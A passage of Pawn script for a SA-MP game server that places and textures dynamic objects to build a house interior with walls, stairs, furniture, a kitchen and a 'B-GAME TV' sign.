	housedjord = CreateDynamicObjectEx(19834,250.160,-1852.522,3333.546,0.000,90.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19834,250.155,-1852.181,3333.546,0.000,90.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19834,250.169,-1851.841,3333.546,0.000,90.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19834,250.164,-1851.501,3333.546,0.000,90.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19834,250.158,-1851.141,3333.546,0.000,90.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19834,250.152,-1850.761,3333.546,0.000,90.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19834,250.159,-1851.521,3334.367,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19834,250.159,-1851.521,3333.986,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19834,250.159,-1851.521,3333.626,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19834,250.159,-1851.521,3333.286,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19834,250.159,-1851.521,3332.906,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19834,250.159,-1851.521,3332.565,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19378,255.908,-1857.658,3332.277,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_furn_floor", 0x00000000);
	housedjord = CreateDynamicObjectEx(19451,255.274,-1854.889,3334.100,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 9524, "blokmodb", "lombard_build1_1", 0x00000000);
	housedjord = CreateDynamicObjectEx(19451,256.606,-1854.540,3334.100,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 9524, "blokmodb", "lombard_build1_1", 0x00000000);
	housedjord = CreateDynamicObjectEx(18762,253.064,-1849.967,3335.689,0.000,270.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 3820, "boxhses_sfsx", "stonewall_la", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(18762,254.314,-1849.955,3335.686,0.000,270.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 3820, "boxhses_sfsx", "stonewall_la", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(18762,256.654,-1849.932,3333.698,0.000,180.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 3820, "boxhses_sfsx", "stonewall_la", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(18762,250.121,-1852.000,3336.157,0.000,90.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 3820, "boxhses_sfsx", "stonewall_la", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(1744,259.167,-1846.677,3332.184,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,259.362,-1846.719,3332.325,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,259.542,-1846.762,3332.473,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,259.782,-1846.759,3332.631,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,259.900,-1846.742,3332.829,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,260.080,-1846.742,3333.000,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,260.240,-1846.724,3333.161,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,260.479,-1846.696,3333.295,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,260.719,-1846.695,3333.416,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19358,260.194,-1848.149,3332.014,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19358,259.033,-1846.212,3334.095,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19378,265.669,-1843.339,3333.679,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_furn_floor", 0x00000000);
	housedjord = CreateDynamicObjectEx(19358,261.630,-1848.152,3332.014,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19358,262.206,-1846.223,3334.095,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19358,262.212,-1847.844,3334.095,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19358,262.206,-1850.981,3334.095,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(1744,261.850,-1848.556,3333.593,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,261.843,-1848.776,3333.794,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,261.845,-1848.936,3333.974,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,261.824,-1849.156,3334.174,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,261.794,-1849.415,3334.355,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,261.748,-1849.634,3334.496,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,261.735,-1849.861,3334.636,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,261.739,-1850.077,3334.823,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,261.752,-1850.265,3334.954,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19358,260.335,-1849.688,3332.366,0.000,0.000,180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19358,260.340,-1850.403,3333.601,35.000,0.000,180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(1744,261.753,-1850.565,3335.114,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,261.740,-1850.826,3335.347,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,261.758,-1851.130,3335.512,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19358,260.325,-1852.249,3334.118,0.000,0.000,180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19358,258.638,-1850.280,3334.062,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19378,257.038,-1855.792,3335.781,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14387, "dr_gsnew", "la_flair1", 0x00000000);
	housedjord = CreateDynamicObjectEx(19358,261.968,-1851.033,3334.095,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19450,262.227,-1851.081,3337.560,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19450,257.416,-1846.209,3337.560,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19358,256.319,-1847.918,3337.386,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19358,258.638,-1850.280,3337.562,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19358,257.563,-1850.279,3337.562,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19358,256.321,-1850.155,3337.391,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(18762,256.654,-1849.932,3338.585,0.000,180.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 3820, "boxhses_sfsx", "stonewall_la", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(19431,260.168,-1851.001,3337.548,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19449,255.437,-1851.734,3337.560,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 4828, "airport3_las", "brwall_128", 0x00000000);
	housedjord = CreateDynamicObjectEx(18762,256.666,-1847.297,3335.704,0.000,270.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 3820, "boxhses_sfsx", "stonewall_la", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(19325,245.939,-1846.247,3333.203,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, -1, "none", "none", 0xFF676767);
	housedjord = CreateDynamicObjectEx(19089,244.974,-1846.270,3332.300,0.000,180.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19089,246.224,-1846.269,3332.300,0.000,180.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19449,262.182,-1856.623,3337.560,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 4828, "airport3_las", "brwall_128", 0x00000000);
	housedjord = CreateDynamicObjectEx(19388,261.268,-1851.713,3337.574,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(19387,261.265,-1851.753,3337.574,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 4828, "airport3_las", "brwall_128", 0x00000000);
	housedjord = CreateDynamicObjectEx(1502,260.459,-1851.716,3335.869,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	SetDynamicObjectMaterial(housedjord, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19449,252.928,-1856.612,3337.560,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 4828, "airport3_las", "brwall_128", 0x00000000);
	housedjord = CreateDynamicObjectEx(19449,260.049,-1858.091,3337.560,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 4828, "airport3_las", "brwall_128", 0x00000000);
	housedjord = CreateDynamicObjectEx(19387,254.399,-1858.104,3337.574,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 4828, "airport3_las", "brwall_128", 0x00000000);
	housedjord = CreateDynamicObjectEx(1502,253.630,-1858.087,3335.869,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	SetDynamicObjectMaterial(housedjord, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19834,247.062,-1852.716,3332.427,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19834,247.042,-1852.709,3333.111,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19834,245.941,-1852.717,3333.301,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19834,247.082,-1852.711,3334.396,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(2259,247.771,-1852.250,3333.761,0.000,90.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	SetDynamicObjectMaterial(housedjord, 1, 10765, "airportgnd_sfse", "white", 0xFF000000);
	housedjord = CreateDynamicObjectEx(2259,247.261,-1852.245,3333.761,0.000,90.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	SetDynamicObjectMaterial(housedjord, 1, 10765, "airportgnd_sfse", "white", 0xFF000000);
	housedjord = CreateDynamicObjectEx(19834,248.187,-1852.711,3333.301,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19834,247.044,-1852.712,3331.899,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(11682,247.468,-1850.094,3332.364,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 5986, "chateau_lawn", "chatwall01_law", 0xFFFFFFFF);
	SetDynamicObjectMaterial(housedjord, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(11684,246.676,-1850.106,3332.364,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 5986, "chateau_lawn", "chatwall01_law", 0xFFFFFFFF);
	SetDynamicObjectMaterial(housedjord, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19376,255.332,-1855.056,3332.283,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
	housedjord = CreateDynamicObjectEx(19451,255.335,-1850.287,3330.628,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0x00000000);
	housedjord = CreateDynamicObjectEx(18762,247.067,-1851.706,3330.094,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(11682,248.547,-1851.992,3332.364,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 5986, "chateau_lawn", "chatwall01_law", 0xFFFFFFFF);
	SetDynamicObjectMaterial(housedjord, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(11684,248.534,-1851.156,3332.364,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 5986, "chateau_lawn", "chatwall01_law", 0xFFFFFFFF);
	SetDynamicObjectMaterial(housedjord, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1906,254.767,-1852.725,3333.203,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFFFF0000);
	housedjord = CreateDynamicObjectEx(1906,254.767,-1852.625,3333.203,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFFFF0000);
	housedjord = CreateDynamicObjectEx(1906,254.767,-1852.525,3333.203,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFFFF0000);
	housedjord = CreateDynamicObjectEx(18762,254.724,-1852.414,3330.709,180.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(2132,252.192,-1854.380,3332.349,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(2133,253.172,-1854.385,3332.349,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(2131,255.163,-1854.370,3332.349,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19920,247.242,-1851.503,3332.603,0.000,0.000,142.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, -1, "none", "none", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(19916,256.056,-1854.521,3332.318,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, -1, "none", "none", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(18762,253.739,-1852.415,3330.709,180.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19327,247.017,-1852.674,3333.321,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterialText(housedjord, 0, "{0066FF}B{FFFFFF}-GAME TV", 140, "Ariel", 20, 1, 0xFFFFFFFF, 0x00000000, 1);
	housedjord = CreateDynamicObjectEx(1906,246.327,-1852.701,3333.306,-90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFFF00000);
	housedjord = CreateDynamicObjectEx(2255,254.637,-1852.465,3333.689,-90.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	SetDynamicObjectMaterial(housedjord, 1, -1, "none", "none", 0xFF000000);
	housedjord = CreateDynamicObjectEx(1906,254.767,-1852.825,3333.203,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFFFF0000);
	housedjord = CreateDynamicObjectEx(2613,254.806,-1851.735,3332.824,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFFFF0000);
	housedjord = CreateDynamicObjectEx(2613,254.368,-1851.743,3332.824,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFFFF0000);
	housedjord = CreateDynamicObjectEx(2613,254.358,-1851.418,3332.824,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFFFF0000);
	housedjord = CreateDynamicObjectEx(2613,254.810,-1851.424,3332.824,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFFFF0000);
	housedjord = CreateDynamicObjectEx(19386,254.421,-1858.212,3337.574,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
	housedjord = CreateDynamicObjectEx(19448,260.708,-1858.194,3337.560,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
	housedjord = CreateDynamicObjectEx(19448,252.984,-1862.986,3337.560,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
	housedjord = CreateDynamicObjectEx(19448,259.731,-1862.970,3337.560,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
	housedjord = CreateDynamicObjectEx(19448,256.953,-1865.135,3337.560,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
	housedjord = CreateDynamicObjectEx(19375,257.203,-1862.911,3335.783,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
	housedjord = CreateDynamicObjectEx(19450,243.308,-1852.147,3334.100,0.000,0.000,45.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(2006,242.720,-1851.356,3333.973,0.000,0.000,-45.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	housedjord = CreateDynamicObjectEx(14446,255.993,-1853.600,3336.227,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(housedjord, 1, 10765, "airportgnd_sfse", "white", 0x00000000);
	SetDynamicObjectMaterial(housedjord, 2, 14387, "dr_gsnew", "mp_gs_wall", 0x00000000);
	housedjord = CreateDynamicObjectEx(2082,253.134,-1852.897,3335.869,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(2082,257.839,-1852.839,3335.869,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19403,260.462,-1856.466,3336.939,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 4828, "airport3_las", "brwall_128", 0x00000000);
	housedjord = CreateDynamicObjectEx(19449,260.472,-1859.678,3339.812,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 4828, "airport3_las", "brwall_128", 0x00000000);
	housedjord = CreateDynamicObjectEx(19449,265.203,-1854.944,3337.560,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 4828, "airport3_las", "brwall_128", 0x00000000);
	housedjord = CreateDynamicObjectEx(1742,258.628,-1850.302,3332.364,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(19433,261.220,-1856.803,3336.308,0.000,90.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	housedjord = CreateDynamicObjectEx(19433,261.223,-1855.499,3338.111,0.000,180.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	housedjord = CreateDynamicObjectEx(19433,261.210,-1857.424,3338.111,0.000,180.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	housedjord = CreateDynamicObjectEx(19433,261.818,-1856.349,3338.111,0.000,180.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
